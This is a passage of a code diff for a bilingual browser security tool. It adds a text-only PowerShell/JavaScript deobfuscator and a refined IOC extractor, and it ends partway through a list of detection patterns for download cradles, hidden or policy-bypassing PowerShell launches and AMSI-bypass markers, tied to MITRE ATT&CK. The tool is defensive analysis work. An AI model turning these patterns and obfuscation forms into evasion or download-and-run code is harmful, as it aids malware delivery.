@@ -737,13 +737,23 @@
     arr.forEach(function (x) { var k = x.toLowerCase(); if (!seen[k]) { seen[k] = 1; out.push(x); } });
     return out;
   }
-  function extract(s) {
+  // Dans du code, « IO.MemoryStream » ou « Net.WebClient » ressemblent à des domaines : on écarte
+  // les racines d'espaces de noms connues et les derniers segments en PascalCase (DeflateStream).
+  var CODE_ROOTS = /^(?:system|io|net|text|reflection|microsoft|management|security|diagnostics|runtime|collections|convert|environment|wscript|scripting|adodb|msxml2|shell|window|document|console|string|array|object|math|json)$/i;
+  function looksLikeCode(h) {
+    var labels = h.split(".");
+    return CODE_ROOTS.test(labels[0]) || /^[A-Z][a-z]{2,}(?:[A-Z][a-z]{2,})+$/.test(labels[labels.length - 1]);
+  }
+  function extract(s, codeAware) {
     var t = refang(s);
     var urls = uniq((t.match(RE.url) || []).map(trimUrl));
     var emails = uniq(findEmails(t).map(function (p) { return t.slice(p[0], p[1]); }));
     var ips = uniq(t.match(RE.ipv4) || []);
     var hosts = [];
-    eachHost(t, function (h) { hosts.push(h.toLowerCase()); return h; });
+    eachHost(t, function (h) {
+      if (!(codeAware && looksLikeCode(h))) hosts.push(h.toLowerCase());
+      return h;
+    });
     var domains = uniq(hosts);
     var sha256 = uniq(t.match(RE.sha256) || []);
     var noSha256 = t.replace(RE.sha256, " ");
@@ -756,15 +766,12 @@
     ];
   }
 
-  function initIoc() {
-    var input = $("#io-input"), outBox = $("#io-results"), status = $("#io-status");
-    var defOut = $("#io-defang-out"), outText = $("#io-text");
-
-    function renderExtract() {
-      var groups = extract(input.value), total = 0, wantDefang = defOut.checked;
-      outBox.innerHTML = "";
-      outText.parentNode.hidden = true;
-      groups.forEach(function (g) {
+  // Affiche les IOC extraits d'un texte, groupés par type ; renvoie leur nombre.
+  // Partagé par l'extracteur d'IOC et le désobfuscateur.
+  function renderIocGroups(outBox, source, wantDefang, codeAware) {
+    var groups = extract(source, codeAware), total = 0;
+    outBox.innerHTML = "";
+    groups.forEach(function (g) {
         if (!g[1].length) return;
         total += g[1].length;
         var items = g[1].map(function (v) {
@@ -795,7 +802,17 @@
         wrap.appendChild(headEl);
         wrap.appendChild(pre);
         outBox.appendChild(wrap);
-      });
+    });
+    return total;
+  }
+
+  function initIoc() {
+    var input = $("#io-input"), outBox = $("#io-results"), status = $("#io-status");
+    var defOut = $("#io-defang-out"), outText = $("#io-text");
+
+    function renderExtract() {
+      outText.parentNode.hidden = true;
+      var total = renderIocGroups(outBox, input.value, defOut.checked);
       if (!input.value.trim()) msg(status, "", "");
       else if (total) msg(status, "ok", L(total + " indicateur(s) trouvé(s), doublons retirés.", total + " indicator(s) found, duplicates removed."));
       else msg(status, "warn", L("Aucun indicateur trouvé.", "No indicators found."));
@@ -813,8 +830,644 @@
     $("#io-text-copy").appendChild(makeCopy(function () { return outText.textContent; }));
   }
 
+  /* ---------- Désobfuscateur de scripts ---------- */
+  // Principe : uniquement des TRANSFORMATIONS DE TEXTE, appliquées en boucle jusqu'à ce que plus
+  // rien ne change (chaque passage retire une « couche »). Le script n'est jamais exécuté :
+  // aucun eval ni new Function ici, et la CSP du site les interdit de toute façon.
+  // Sécurité du moteur : expressions régulières sans retour arrière catastrophique (blancs
+  // bornés, alternatives disjointes), taille d'entrée et de sortie plafonnées (bombes de
+  // décompression), résultats affichés uniquement via textContent.
+
+  var DEOB_MAX_INPUT = 2 * 1024 * 1024, DEOB_MAX_OUTPUT = 8 * 1024 * 1024, DEOB_MAX_STEPS = 80;
+  // 'texte' ('' = apostrophe). Les gardes (?<!') et (?!') lèvent l'ambiguïté entre « fin de
+  // chaîne » et « apostrophe doublée » : sans elles, une longue suite d'apostrophes coûtait un
+  // temps quadratique (déni de service trouvé en test).
+  var PS_SQ = "(?<!')'(?:[^']|'')*'(?!')";
+  var PS_DQ = '"(?:[^"`]|`[\\s\\S])*"';                 // "texte" (` = échappement)
+  var PS_LIT = "(?:" + PS_SQ + "|" + PS_DQ + ")";
+  var JS_SQ = "'(?:[^'\\\\\\n]|\\\\[\\s\\S])*'";        // 'texte' (\ = échappement)
+  var JS_DQ = '"(?:[^"\\\\\\n]|\\\\[\\s\\S])*"';
+  var JS_LIT = "(?:" + JS_SQ + "|" + JS_DQ + ")";
+  var SP = "[ \\t\\r\\n]{0,20}";
+  var NUM = "(?:0x[0-9a-fA-F]{1,6}|\\d{1,7})";
+  var NUMLIST = NUM + "(?:" + SP + "," + SP + NUM + "){0,100000}";
+
+  function psValue(lit) {
+    var s = lit.slice(1, -1);
+    if (lit[0] === "'") return s.replace(/''/g, "'");
+    var map = { "0": "\0", a: "\x07", b: "\b", e: "\x1b", f: "\f", n: "\n", r: "\r", t: "\t", v: "\v" };
+    return s.replace(/`([\s\S])/g, function (m, c) {
+      return Object.prototype.hasOwnProperty.call(map, c) ? map[c] : c;
+    });
+  }
+  function psQuote(v) { return "'" + v.replace(/'/g, "''") + "'"; }
+  function jsValue(lit) {
+    return lit.slice(1, -1).replace(/\\(?:x([0-9a-fA-F]{2})|u\{([0-9a-fA-F]{1,6})\}|u([0-9a-fA-F]{4})|([0-7]{1,3})|([\s\S]))/g,
+      function (m, x, ub, u, oct, c) {
+        if (x) return String.fromCharCode(parseInt(x, 16));
+        if (ub) { var cp = parseInt(ub, 16); return cp <= 0x10ffff ? String.fromCodePoint(cp) : ""; }
+        if (u) return String.fromCharCode(parseInt(u, 16));
+        if (oct) return String.fromCharCode(parseInt(oct, 8) & 0xff);
+        var map = { n: "\n", r: "\r", t: "\t", b: "\b", f: "\f", v: "\v" };
+        return Object.prototype.hasOwnProperty.call(map, c) ? map[c] : c;
+      });
+  }
+  function jsQuote(v) {
+    return "'" + v.replace(/[\\'\x00-\x1f\x7f]/g, function (c) {
+      if (c === "\\") return "\\\\";
+      if (c === "'") return "\\'";
+      if (c === "\n") return "\\n";
+      if (c === "\r") return "\\r";
+      if (c === "\t") return "\\t";
+      var h = c.charCodeAt(0).toString(16);
+      return "\\x" + (h.length < 2 ? "0" : "") + h;
+    }) + "'";
+  }
+  function codeToChar(n) { return n >= 0 && n <= 0x10ffff ? String.fromCodePoint(n) : ""; }
+  function parseNum(s) { return /^0x/i.test(s) ? parseInt(s, 16) : parseInt(s, 10); }
+  function numsToString(list) {
+    return list.split(",").map(function (x) { return codeToChar(parseNum(x.trim())); }).join("");
+  }
+  function escapeRegex(s) { return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }
+
+  // PowerShell ou JavaScript ? Décide quelle syntaxe de chaînes appliquer à ce passage.
+  function detectLang(t) {
+    var sample = t.length > 200000 ? t.slice(0, 200000) : t;
+    var ps = (sample.match(/\$[A-Za-z_]\w*|\[char\]|-join\b|::|\bIEX\b|Invoke-|\s-f\s|powershell|New-Object|`/gi) || []).length;
+    var js = (sample.match(/\bvar\s|\blet\s|\bconst\s|\bfunction\b|fromCharCode|atob\(|eval\(|=>|ActiveXObject|WScript|document\./g) || []).length;
+    return js > ps ? "js" : "ps";
+  }
+
+  function printableRatio(s) {
+    var n = Math.min(s.length, 4000), ok = 0;
+    if (!n) return 0;
+    for (var i = 0; i < n; i++) {
+      var c = s.charCodeAt(i);
+      if ((c >= 0x20 && c !== 0x7f && c !== 0xfffd) || c === 9 || c === 10 || c === 13) ok++;
+    }
+    return ok / n;
+  }
+  // Octets → texte : UTF-16LE (PowerShell -EncodedCommand, Encoding.Unicode) si un octet sur
+  // deux est nul, sinon UTF-8.
+  function bytesToScript(bytes, forced) {
+    var enc = forced;
+    if (!enc) {
+      var n = Math.min(bytes.length, 4000), zeros = 0;
+      for (var i = 1; i < n; i += 2) if (bytes[i] === 0) zeros++;
+      enc = n > 1 && zeros / Math.floor(n / 2) > 0.3 ? "utf-16le" : "utf-8";
+    }
+    var text = new TextDecoder(enc).decode(bytes);
+    return { text: text, enc: enc, ok: text.length > 0 && printableRatio(text) >= 0.9 };
+  }
+  function looksCompressed(b) {
+    return (b[0] === 0x1f && b[1] === 0x8b) || (b[0] === 0x78 && (b[0] * 256 + b[1]) % 31 === 0);
+  }
+  // Décompression native du navigateur, interrompue au-delà de DEOB_MAX_OUTPUT (bombes).
+  function decompress(bytes, format) {
+    if (typeof DecompressionStream === "undefined") return Promise.reject(new Error("unsupported"));
+    var ds = new DecompressionStream(format), writer = ds.writable.getWriter();
+    writer.write(bytes).catch(function () {});
+    writer.close().catch(function () {});
+    var reader = ds.readable.getReader(), chunks = [], total = 0;
+    function pump() {
+      return reader.read().then(function (r) {
+        if (r.done) {
+          var out = new Uint8Array(total), o = 0;
+          chunks.forEach(function (c) { out.set(c, o); o += c.length; });
+          return out;
+        }
+        total += r.value.length;
+        if (total > DEOB_MAX_OUTPUT) { reader.cancel().catch(function () {}); throw new Error("bomb"); }
+        chunks.push(r.value);
+        return pump();
+      });
+    }
+    return pump();
+  }
+  function tryDecompress(bytes) {
+    var formats = bytes[0] === 0x1f && bytes[1] === 0x8b ? ["gzip"] : bytes[0] === 0x78 ? ["deflate", "deflate-raw"] : ["deflate-raw"];
+    var i = 0;
+    function next(err) {
+      if (err && err.message === "bomb") return Promise.reject(err);
+      if (i >= formats.length) return Promise.resolve(null);
+      var f = formats[i++];
+      return decompress(bytes, f).then(function (out) { return { bytes: out, format: f }; }, next);
+    }
+    return next();
+  }
+
+  // Remplacement asynchrone (pour la décompression) : les correspondances sont traitées dans l'ordre.
+  function replaceAsync(text, re, fn) {
+    var parts = [], jobs = [], last = 0, m;
+    re.lastIndex = 0;
+    while ((m = re.exec(text)) !== null) {
+      parts.push(text.slice(last, m.index));
+      jobs.push({ m: m, idx: parts.length });
+      parts.push(m[0]);
+      last = m.index + m[0].length;
+      if (!m[0].length) re.lastIndex++;
+    }
+    parts.push(text.slice(last));
+    return jobs.reduce(function (p, j) {
+      return p.then(function (n) {
+        return Promise.resolve(fn.apply(null, j.m)).then(function (r) {
+          if (r != null && r !== j.m[0]) { parts[j.idx] = r; return n + 1; }
+          return n;
+        });
+      });
+    }, Promise.resolve(0)).then(function (n) { return n ? { text: parts.join(""), n: n } : null; });
+  }
+  function replaceSync(text, re, fn) {
+    var n = 0;
+    var out = text.replace(re, function () {
+      var r = fn.apply(null, arguments);
+      if (r != null && r !== arguments[0]) { n++; return r; }
+      return arguments[0];
+    });
+    return n ? { text: out, n: n } : null;
+  }
+
+  // Insère un contenu décodé : chaîne courte → littéral (combinable par les règles suivantes),
+  // sinon bloc lisible encadré de commentaires.
+  function embed(decoded, lang, label) {
+    if (decoded.length <= 300 && !/[\r\n]/.test(decoded)) return lang === "js" ? jsQuote(decoded) : psQuote(decoded);
+    var c = lang === "js" ? "//" : "#";
+    var title = document.documentElement.lang === "fr" ? "décodé : " : "decoded: ";
+    return "\n" + c + " ──── " + title + label + " ────\n" + decoded + "\n" + c + " ──── fin / end ────\n";
+  }
+  function lit(lang) { return lang === "js" ? JS_LIT : PS_LIT; }
+  function val(s, lang) { return lang === "js" ? jsValue(s) : psValue(s); }
+  function quote(v, lang) { return lang === "js" ? jsQuote(v) : psQuote(v); }
+
+  var ENCODINGS = { unicode: "utf-16le", bigendianunicode: "utf-16be", utf8: "utf-8", ascii: "utf-8", default: "utf-8", utf7: "utf-8" };
+
+  var RULES = [
+    {
+      fr: "Entrée entièrement en Base64 décodée", en: "Base64-only input decoded",
+      run: function (t) {
+        // tout le texte est un bloc Base64 (éventuellement coupé en lignes de 64 ou 76 caractères)
+        var s = t.trim(), compact = s.replace(/\s+/g, "");
+        if (compact.length < 16 || !/^[A-Za-z0-9+\/_-]+={0,2}$/.test(compact)) return null;
+        if ((s.match(/\s+/g) || []).length > compact.length / 60 + 1) return null;
+        var bytes;
+        try { bytes = b64decode(compact); } catch (e) { return null; }
+        if (bytes.length < 8) return null;
+        if (looksCompressed(bytes)) {
+          return tryDecompress(bytes).then(function (r) {
+            if (!r) return null;
+            var d = bytesToScript(r.bytes);
+            return d.ok ? { text: d.text, n: 1 } : null;
+          });
+        }
+        var d = bytesToScript(bytes);
+        return d.ok && d.text !== t ? { text: d.text, n: 1 } : null;
+      }
+    },
+    {
+      fr: "Commande PowerShell -EncodedCommand décodée (Base64, UTF-16LE)", en: "PowerShell -EncodedCommand decoded (Base64, UTF-16LE)",
+      run: function (t) {
+        // PowerShell accepte tout préfixe de -EncodedCommand (-e, -en, -enc…) et -ec, et les
+        // tirets typographiques (–, —) que les attaquants utilisent pour tromper les détections.
+        return replaceSync(t, /([\-–—―\/])(e[a-z]{0,13})\b([ \t]{1,20})(["']?)([A-Za-z0-9+\/]{12,}={0,2})\4/gi,
+          function (m, dash, flag, sp, q, blob) {
+            var f = flag.toLowerCase();
+            if ("encodedcommand".indexOf(f) !== 0 && f !== "ec") return null;
+            var bytes;
+            try { bytes = b64decode(blob); } catch (e) { return null; }
+            var d = bytesToScript(bytes);
+            if (!d.ok) return null;
+            return "-Command {\n" + d.text + "\n}";
+          });
+      }
+    },
+    {
+      fr: "Accents graves (`) retirés des mots-clés", en: "Backticks removed from keywords",
+      lang: "ps",
+      run: function (t) {
+        if (t.indexOf("`") < 0) return null;
+        return replaceSync(t, new RegExp(PS_SQ + "|" + PS_DQ + "|`(?=[A-Za-z0-9_\\-])", "g"),
+          function (m) { return m === "`" ? "" : null; });
+      }
+    },
+    {
+      fr: "Accents circonflexes (^) de cmd.exe retirés", en: "cmd.exe carets (^) removed",
+      run: function (t) {
+        var hits = t.match(/[A-Za-z0-9]\^[A-Za-z0-9]/g);
+        if (!hits || hits.length < 3) return null;
+        return replaceSync(t, /([A-Za-z0-9])\^(?=[A-Za-z0-9])/g, function (m, c) { return c; });
+      }
+    },
+    {
+      fr: "Codes de caractères [char] convertis", en: "[char] codes converted",
+      lang: "ps",
+      run: function (t) {
+        var r = replaceSync(t, new RegExp("\\[char\\[\\]\\]" + SP + "@?\\(" + SP + "(" + NUMLIST + ")" + SP + "\\)" + SP + "-join" + SP + "(?:''|\"\")", "gi"),
+          function (m, list) { return psQuote(numsToString(list)); });
+        if (r) return r;
+        r = replaceSync(t, new RegExp("-join" + SP + "\\[char\\[\\]\\]" + SP + "@?\\(" + SP + "(" + NUMLIST + ")" + SP + "\\)", "gi"),
+          function (m, list) { return psQuote(numsToString(list)); });
+        if (r) return r;
+        r = replaceSync(t, new RegExp("-join" + SP + "\\(" + SP + "(?:\\(" + SP + "(" + NUMLIST + ")" + SP + "\\)|(" + NUMLIST + "))" + SP + "\\|" + SP +
+          "(?:%|foreach(?:-object)?)" + SP + "\\{" + SP + "\\[char\\]" + SP + "(?:\\[int\\]" + SP + ")?\\$_" + SP + "\\}" + SP + "\\)", "gi"),
+          function (m, a, b) { return psQuote(numsToString(a || b)); });
+        if (r) return r;
+        // parenthèses seulement par paire : [char](65) ou [char]65, jamais la « ) » d'un appel voisin
+        return replaceSync(t, new RegExp("\\[char\\]" + SP + "(?:\\[int\\]" + SP + ")?(?:\\(" + SP + "(" + NUM + ")" + SP + "\\)|(" + NUM + "))", "gi"),
+          function (m, a, b) { var c = codeToChar(parseNum(a || b)); return c ? psQuote(c) : null; });
+      }
+    },
+    {
+      fr: "String.fromCharCode converti", en: "String.fromCharCode converted",
+      lang: "js",
+      run: function (t) {
+        return replaceSync(t, new RegExp("String\\.fromCharCode\\(" + SP + "(" + NUMLIST + ")" + SP + "\\)", "g"),
+          function (m, list) { return jsQuote(numsToString(list)); });
+      }
+    },
+    {
+      fr: "Séquences d'échappement (\\x41, \\u0041…) décodées", en: "Escape sequences (\\x41, \\u0041…) decoded",
+      lang: "js",
+      run: function (t) {
+        return replaceSync(t, new RegExp(JS_LIT, "g"), function (m) {
+          if (!/\\(?:x|u|[0-7])/.test(m)) return null;
+          var q = jsQuote(jsValue(m));
+          return q !== m ? q : null;
+        });
+      }
+    },
+    {
+      fr: "Chaînes concaténées réunies", en: "Concatenated strings merged",
+      run: function (t, lang) {
+        // Priorité des opérateurs : un littéral suivi d'un appel (.split…), d'un index ([…]) ou,
+        // en PowerShell, de -f, appartient d'abord à cette opération : on ne le fusionne pas.
+        // De même en PowerShell pour un littéral précédé de -f (il est l'argument du format).
+        var before = lang === "ps" ? "(?<!-f[ \\t]{0,20})" : "";
+        var after = lang === "ps" ? "(?![ \\t]{0,20}(?:[.\\[]|-f(?![A-Za-z])))" : "(?![ \\t]{0,20}[.\\[])";
+        var re = new RegExp(before + "(" + lit(lang) + ")" + SP + "\\+" + SP + "(" + lit(lang) + ")" + after, "g"), total = 0, r;
+        while ((r = replaceSync(t, re, function (m, a, b) { return quote(val(a, lang) + val(b, lang), lang); }))) {
+          t = r.text;
+          total += r.n;
+          if (total > 1e6) break;
+        }
+        return total ? { text: t, n: total } : null;
+      }
+    },
+    {
+      fr: "Parenthèses superflues autour d'une chaîne retirées", en: "Redundant parentheses around strings removed",
+      run: function (t, lang) {
+        return replaceSync(t, new RegExp("(?<![\\w\\])$.])\\(" + SP + "(" + lit(lang) + ")" + SP + "\\)", "g"),
+          function (m, a) { return a; });
+      }
+    },
+    {
+      fr: "Opérateur de format -f appliqué", en: "Format operator -f applied",
+      lang: "ps",
+      run: function (t) {
+        return replaceSync(t, new RegExp("(" + PS_LIT + ")" + SP + "-f(?![A-Za-z])" + SP + "(" + PS_LIT + "(?:" + SP + "," + SP + PS_LIT + "){0,1000})", "gi"),
+          function (m, fmt, args) {
+            var vals = args.match(new RegExp(PS_LIT, "g")).map(psValue);
+            var ok = true;
+            var out = psValue(fmt).replace(/\{\{|\}\}|\{(\d{1,4})(?:,-?\d{1,5})?(?::[^{}]{0,20})?\}/g, function (x, i) {
+              if (x === "{{") return "{";
+              if (x === "}}") return "}";
+              if (vals[+i] === undefined) { ok = false; return x; }
+              return vals[+i];
+            });
+            return ok ? psQuote(out) : null;
+          });
+      }
+    },
+    {
+      fr: "Remplacements de texte (.Replace, -replace) appliqués", en: "Text replacements (.Replace, -replace) applied",
+      run: function (t, lang) {
+        var L_ = lit(lang);
+        var r = replaceSync(t, new RegExp("(" + L_ + ")" + SP + "\\.replace(All)?\\(" + SP + "(" + L_ + ")" + SP + "," + SP + "(" + L_ + ")" + SP + "\\)", "gi"),
+          function (m, s, all, a, b) {
+            var v = val(s, lang), from = val(a, lang), to = val(b, lang);
+            if (!from) return null;
+            // .NET .Replace et JS replaceAll remplacent tout ; JS .replace seulement la première occurrence
+            var allOcc = lang === "ps" || !!all;
+            return quote(allOcc ? v.split(from).join(to) : v.replace(from, function () { return to; }), lang);
+          });
+        if (r || lang !== "ps") return r;
+        // -replace utilise une expression régulière : on ne l'applique que si le motif est un simple texte
+        return replaceSync(t, new RegExp("(" + PS_LIT + ")" + SP + "-(c|i)?replace" + SP + "(" + PS_LIT + ")(?:" + SP + "," + SP + "(" + PS_LIT + "))?", "gi"),
+          function (m, s, mode, a, b) {
+            var from = psValue(a), to = b ? psValue(b) : "";
+            if (!from || /[\\^$.|?*+()[\]{}]/.test(from) || to.indexOf("$") >= 0) return null;
+            var flags = "g" + ((mode || "").toLowerCase() === "c" ? "" : "i");
+            return psQuote(psValue(s).replace(new RegExp(escapeRegex(from), flags), function () { return to; }));
+          });
+      }
+    },
+    {
+      fr: "Chaînes inversées remises à l'endroit", en: "Reversed strings put back in order",
+      run: function (t, lang) {
+        if (lang === "js") {
+          return replaceSync(t, new RegExp("(" + JS_LIT + ")\\.split\\(" + SP + "(?:''|\"\")" + SP + "\\)\\.reverse\\(" + SP + "\\)\\.join\\(" + SP + "(?:''|\"\")" + SP + "\\)", "g"),
+            function (m, s) { return jsQuote(Array.from(jsValue(s)).reverse().join("")); });
+        }
+        var rev = function (s, n) { return Array.from(psValue(s)).reverse().slice(0, +n).join(""); };
+        var r = replaceSync(t, new RegExp("-join" + SP + "\\(" + SP + "(" + PS_LIT + ")" + SP + "\\[" + SP + "-1" + SP + "\\.\\." + SP + "-" + SP + "(\\d{1,7})" + SP + "\\]" + SP + "\\)", "gi"),
+          function (m, s, n) { return psQuote(rev(s, n)); });
+        if (r) return r;
+        return replaceSync(t, new RegExp("(" + PS_LIT + ")" + SP + "\\[" + SP + "-1" + SP + "\\.\\." + SP + "-" + SP + "(\\d{1,7})" + SP + "\\]" + SP + "-join" + SP + "(?:''|\"\")", "gi"),
+          function (m, s, n) { return psQuote(rev(s, n)); });
+      }
+    },
+    {
+      fr: "Tableaux de chaînes joints", en: "String arrays joined",
+      run: function (t, lang) {
+        if (lang === "js") {
+          return replaceSync(t, new RegExp("\\[" + SP + "(" + JS_LIT + "(?:" + SP + "," + SP + JS_LIT + "){0,10000})" + SP + ",?" + SP + "\\]\\.join\\(" + SP + "(" + JS_LIT + ")?" + SP + "\\)", "g"),
+            function (m, items, sep) {
+              return jsQuote(items.match(new RegExp(JS_LIT, "g")).map(jsValue).join(sep ? jsValue(sep) : ","));
+            });
+        }
+        var r = replaceSync(t, new RegExp("-join" + SP + "\\(" + SP + "(" + PS_LIT + "(?:" + SP + "," + SP + PS_LIT + "){1,10000})" + SP + "\\)", "gi"),
+          function (m, items) { return psQuote(items.match(new RegExp(PS_LIT, "g")).map(psValue).join("")); });
+        if (r) return r;
+        return replaceSync(t, new RegExp("\\(" + SP + "(" + PS_LIT + "(?:" + SP + "," + SP + PS_LIT + "){1,10000})" + SP + "\\)" + SP + "-join" + SP + "(" + PS_LIT + ")", "gi"),
+          function (m, items, sep) { return psQuote(items.match(new RegExp(PS_LIT, "g")).map(psValue).join(psValue(sep))); });
+      }
+    },
+    {
+      fr: "unescape / decodeURIComponent décodés", en: "unescape / decodeURIComponent decoded",
+      lang: "js",
+      run: function (t) {
+        return replaceSync(t, new RegExp("\\b(unescape|decodeURIComponent|decodeURI)\\(" + SP + "(" + JS_LIT + ")" + SP + "\\)", "g"),
+          function (m, fn, s) {
+            var v = jsValue(s);
+            if (fn === "unescape") {
+              return jsQuote(v.replace(/%u([0-9a-fA-F]{4})|%([0-9a-fA-F]{2})/g, function (x, u, h) {
+                return String.fromCharCode(parseInt(u || h, 16));
+              }));
+            }
+            try { return jsQuote(decodeURIComponent(v)); } catch (e) { return null; }
+          });
+      }
+    },
+    {
+      fr: "Base64 décodé ([Convert]::FromBase64String)", en: "Base64 decoded ([Convert]::FromBase64String)",
+      lang: "ps",
+      run: function (t) {
+        var wrapped = new RegExp("\\[(?:System\\.)?Text\\.Encoding\\]::(\\w{2,20})\\.GetString\\(" + SP + "\\[(?:System\\.)?Convert\\]::FromBase64String\\(" + SP + "(" + PS_LIT + ")" + SP + "\\)" + SP + "\\)", "gi");
+        var r = replaceSync(t, wrapped, function (m, encName, s) {
+          var bytes;
+          try { bytes = b64decode(psValue(s)); } catch (e) { return null; }
+          var d = bytesToScript(bytes, ENCODINGS[encName.toLowerCase()]);
+          return d.ok ? embed(d.text, "ps", "Base64 (" + d.enc + ")") : null;
+        });
+        if (r) return r;
+        var compressedHint = /DeflateStream|GzipStream|ZLibStream/i.test(t);
+        return replaceAsync(t, new RegExp("\\[(?:System\\.)?Convert\\]::FromBase64String\\(" + SP + "(" + PS_LIT + ")" + SP + "\\)", "gi"),
+          function (m, s) {
+            var bytes;
+            try { bytes = b64decode(psValue(s)); } catch (e) { return null; }
+            if (compressedHint || looksCompressed(bytes)) {
+              return tryDecompress(bytes).then(function (res) {
+                if (!res) return null;
+                var d = bytesToScript(res.bytes);
+                return d.ok ? embed(d.text, "ps", "Base64 + " + res.format) : null;
+              });
+            }
+            var d = bytesToScript(bytes);
+            return d.ok ? embed(d.text, "ps", "Base64 (" + d.enc + ")") : null;
+          });
+      }
+    },
+    {
+      fr: "Base64 décodé (atob)", en: "Base64 decoded (atob)",
+      lang: "js",
+      run: function (t) {
+        function decode(s) {
+          var bytes;
+          try { bytes = b64decode(jsValue(s)); } catch (e) { return null; }
+          var d = bytesToScript(bytes, "utf-8");
+          return d.ok ? d.text : null;
+        }
+        var r = replaceSync(t, new RegExp("\\beval\\s{0,5}\\(" + SP + "atob\\(" + SP + "(" + JS_LIT + ")" + SP + "\\)" + SP + "\\)", "g"),
+          function (m, s) { var v = decode(s); return v == null ? null : embed(v + "\n", "js", "eval(atob(…))"); });
+        if (r) return r;
+        return replaceSync(t, new RegExp("\\b(?:window\\.)?atob\\(" + SP + "(" + JS_LIT + ")" + SP + "\\)", "g"),
+          function (m, s) { var v = decode(s); return v == null ? null : embed(v, "js", "atob"); });
+      }
+    },
+    {
+      fr: "Code passé à eval / IEX mis à plat (sans l'exécuter)", en: "Code passed to eval / IEX unwrapped (not executed)",
+      run: function (t, lang) {
+        if (lang === "js") {
+          var r = replaceSync(t, new RegExp("\\b(?:new\\s{1,5})?Function\\s{0,5}\\(" + SP + "(" + JS_LIT + ")" + SP + "\\)" + SP + "\\(" + SP + "\\)", "g"),
+            function (m, s) { return embed(jsValue(s) + "\n", "js", "Function(…)()"); });
+          if (r) return r;
+          return replaceSync(t, new RegExp("\\beval\\s{0,5}\\(" + SP + "(" + JS_LIT + ")" + SP + "\\)", "g"),
+            function (m, s) { return embed(jsValue(s) + "\n", "js", "eval(…)"); });
+        }
+        var r2 = replaceSync(t, new RegExp("\\b(?:IEX|Invoke-Expression)\\s{0,5}\\(" + SP + "(" + PS_LIT + ")" + SP + "\\)", "gi"),
+          function (m, s) { return embed(psValue(s) + "\n", "ps", "IEX"); });
+        if (r2) return r2;
+        r2 = replaceSync(t, new RegExp("\\b(?:IEX|Invoke-Expression)[ \\t]{1,5}(" + PS_LIT + ")", "gi"),
+          function (m, s) { return embed(psValue(s) + "\n", "ps", "IEX"); });
+        if (r2) return r2;
+        return replaceSync(t, new RegExp("(" + PS_LIT + ")" + SP + "\\|" + SP + "(?:IEX|Invoke-Expression)\\b", "gi"),
+          function (m, s) { return embed(psValue(s) + "\n", "ps", "| IEX"); });
+      }
+    },
+    {
+      fr: "Variables constantes remplacées par leur valeur", en: "Constant variables replaced by their value",
+      run: function (t, lang) {
+        var L_ = lit(lang), assigns = {}, values = {};
+        var anyAssign = lang === "js"
+          ? /(?:^|[^\w$.])([A-Za-z_$][\w$]{0,60})[ \t]{0,10}(?:[+\-*\/%|&^]|<<|>>>?)?=(?!=)/g
+          : /\$([A-Za-z_][\w]{0,60})[ \t]{0,10}(?:[+\-*\/%])?=(?!=)/g;
+        var m;
+        while ((m = anyAssign.exec(t)) !== null) {
+          var k = lang === "js" ? m[1] : m[1].toLowerCase();
+          assigns[k] = (assigns[k] || 0) + 1;
+        }
+        var litAssign = lang === "js"
+          ? new RegExp("(?:var|let|const)\\s{1,5}([A-Za-z_$][\\w$]{0,60})[ \\t]{0,10}=[ \\t]{0,10}(" + JS_LIT + ")[ \\t]{0,10}(?:;|\\n|$)", "g")
+          : new RegExp("\\$([A-Za-z_][\\w]{0,60})[ \\t]{0,10}=[ \\t]{0,10}(" + PS_LIT + ")[ \\t]{0,10}(?:;|\\r?\\n|$)", "g");
+        while ((m = litAssign.exec(t)) !== null) {
+          var key = lang === "js" ? m[1] : m[1].toLowerCase();
+          if (assigns[key] === 1) values[key] = m[2];
+        }
+        var names = Object.keys(values);
+        if (!names.length) return null;
+        var budget = 1024 * 1024;
+        var usage = lang === "js"
+          ? new RegExp(L_ + "|(?<![\\w$.])(" + names.map(escapeRegex).join("|") + ")(?![\\w$])(?![ \\t]{0,10}(?:[+\\-*\\/%|&^]|<<|>>>?)?=(?!=))", "g")
+          : new RegExp(L_ + "|\\$(" + names.map(escapeRegex).join("|") + ")(?![\\w])(?![ \\t]{0,10}(?:[+\\-*\\/%])?=(?!=))", "gi");
+        return replaceSync(t, usage, function (whole, name) {
+          if (!name) return null; // un littéral : laissé tel quel
+          var v = values[lang === "js" ? name : name.toLowerCase()];
+          budget -= v.length;
+          return budget > 0 ? v : null;
+        });
+      }
+    }
+  ];
+
+  function deobfuscate(src) {
+    var steps = [], text = src;
+    function loop(i) {
+      if (i >= DEOB_MAX_STEPS) return Promise.resolve({ text: text, steps: steps, capped: true });
+      var lang = detectLang(text), k = 0;
+      function tryRule() {
+        if (k >= RULES.length) return Promise.resolve(false);
+        var rule = RULES[k++];
+        if (rule.lang && rule.lang !== lang) return tryRule();
+        return Promise.resolve(rule.run(text, lang)).then(function (r) {
+          if (!r || r.text === text) return tryRule();
+          if (r.text.length > DEOB_MAX_OUTPUT) throw new Error("bomb");
+          text = r.text;
+          steps.push({ fr: rule.fr, en: rule.en, n: r.n, text: text });
+          return true;
+        });
+      }
+      return tryRule().then(function (applied) {
+        return applied ? loop(i + 1) : { text: text, steps: steps, capped: false };
+      });
+    }
+    return loop(0);
+  }
+
+  // Comportements typiques, rattachés aux techniques MITRE ATT&CK.
+  var BEHAVIORS = [
+    [/\b(?:IEX|Invoke-Expression)\b|\beval\s*\(|\bnew\s+Function\b|\.Invoke\s*\(/i, "Exécution de code généré à la volée", "Execution of dynamically generated code", "T1059"],
+    [/DownloadString|DownloadFile|DownloadData|Invoke-WebRequest|\biwr\b|Invoke-RestMethod|\birm\b|Net\.WebClient|Start-BitsTransfer|bitsadmin|XMLHTTP|WinHttp|\bcurl(?:\.exe)?\s|\bwget\s|certutil[^\n]{0,40}urlcache/i, "Téléchargement depuis Internet", "Download from the Internet", "T1105"],
+    [/-w(?:indowstyle)?\s{1,5}h(?:idden)?\b|\s-nop\b|\s-noni\b|-ExecutionPolicy\s{1,5}bypass|\s-ep\s{1,5}bypass|\s-enc(?:odedcommand)?\s/i, "PowerShell lancé discrètement (fenêtre cachée, politique contournée, commande encodée)", "Stealthy PowerShell launch (hidden window, bypassed policy, encoded command)", "T1059.001"],
+    [/AmsiUtils|amsiInitFailed|AmsiScanBuffer/i, "Contournement de l'AMSI (analyse antivirus des scripts)", "AMSI bypass (antivirus script scanning)", "T1562.001"],
